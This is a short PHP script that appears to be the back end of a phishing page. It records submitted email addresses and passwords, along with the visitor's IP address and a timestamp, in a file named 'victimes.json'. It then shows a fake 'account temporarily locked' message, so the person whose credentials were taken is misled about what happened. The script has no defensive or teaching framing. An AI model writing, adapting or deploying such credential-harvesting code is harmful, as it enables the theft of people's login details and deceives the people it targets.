<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['user'] ?? 'Unknown';
    $category = $_POST['category'] ?? 'Unknown';
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $victim_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'user' => $user,
        'category' => $category,
        'email' => $email,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR']
    ];

    $victims = [];
    if (file_exists('victimes.json')) {
        $victims = json_decode(file_get_contents('victimes.json'), true) ?: [];
    }
    $victims[] = $victim_data;
    file_put_contents('victimes.json', json_encode($victims));

    echo "<h1>Access Denied</h1><p>Sorry, your account is temporarily locked. Please try again later.</p>";
}
?>
